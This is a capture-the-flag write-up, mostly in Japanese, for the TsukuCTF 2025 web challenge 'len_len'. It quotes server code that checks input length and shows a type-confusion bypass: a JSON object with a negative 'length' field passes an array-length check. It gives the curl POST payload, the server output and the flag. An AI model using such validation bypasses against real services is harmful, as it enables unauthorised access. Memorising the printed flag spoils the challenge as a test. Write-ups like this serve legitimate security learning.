# len_len

"length".length is 6 ?
curl http://challs.tsukuctf.org:28888

## solution

server.jsのchall()関数に注目する
```
const sanitized = str.replaceAll(" ", "");
if (sanitized.length < 10) {
  return `error: no flag for you. sanitized string is ${sanitized}, length is ${sanitized.length.toString()}`;
}
const array = JSON.parse(sanitized);
if (array.length < 0) {
  return FLAG;
}
```

flagを返す条件は

- sanitized.length >= 10
- JSON.parse(sanitized).length < 0

Q,JSON.parse(sanitized).length < 0 を満たすには

`{"length": -1}`のようなJSONはJavaScriptの配列ではなく、ただのオブジェクトです。そのため .length < 0 という条件は満たせません。でも、配列っぽく見せかける手法

.length は数値として比較される、つまり、配列じゃなくても .length があるならOK。
```
const obj = JSON.parse('{"length": -1}');
if (obj.length < 0) {
  console.log("FLAG!");
}
```


Payload
```
curl -X POST -d 'array={"length":-1}' http://challs.tsukuctf.org:28888
```

出力
```
/TsukuCTF_2025$ curl -X POST -d 'array={"length":-1}' http://challs.tsukuctf.org:28888
TsukuCTF25{l4n_l1n_lun_l4n_l0n}
```

## flag

`TsukuCTF25{l4n_l1n_lun_l4n_l0n}`